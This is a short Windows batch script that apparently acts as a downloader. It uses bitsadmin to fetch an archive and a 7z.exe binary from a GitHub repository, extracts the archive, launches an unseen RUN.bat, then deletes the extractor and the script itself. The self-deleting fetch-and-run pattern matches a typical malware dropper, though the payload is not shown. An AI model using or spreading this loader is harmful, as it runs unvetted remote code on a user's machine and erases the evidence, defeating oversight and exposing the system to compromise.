@echo off
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/INSTALL.rar "%~dp0INSTALL.rar"
bitsadmin.exe /transfer "LOL" /priority FOREGROUND https://raw.githubusercontent.com/bugai66/Elysium_Files/master/7z.exe "%~dp07z.exe"
"%~dp0\7z" e "INSTALL.rar"
start cmd /c "RUN.bat"
DEL "%~dp07z.exe"
DEL "%~f0"
EXIT